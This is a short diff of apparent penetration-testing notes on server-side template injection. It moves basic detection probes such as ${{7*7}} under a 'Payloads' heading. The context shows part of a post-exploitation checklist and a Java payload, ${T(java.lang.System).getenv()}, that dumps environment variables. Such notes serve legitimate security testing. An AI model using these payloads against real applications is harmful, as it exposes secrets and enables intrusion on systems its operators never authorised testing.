@@ -4,13 +4,6 @@ Template injection allows an attacker to include template code into an existant 
 A template engine makes designing HTML pages easier by using static template files which at runtime replaces variables/placeholders with actual values in the HTML pages
 
 
-Basic injection  
-
-#${7*7} 
-${{7*7}}
-%7B%7B4*4%7D%7D
-nxmve$%7B30*30%7Dac2nj 
-
 Checklists 
 
 System Information:
@@ -38,6 +31,16 @@ Is root's home directory accessible
 List permissions for /home/ 
 
 Payloads: 
+
+Basic injection  
+
+#${7*7}  
+
+${{7*7}} 
+
+%7B%7B4*4%7D%7D 
+
+nxmve$%7B30*30%7Dac2nj 
 
 ${T(java.lang.System).getenv()}.  
 
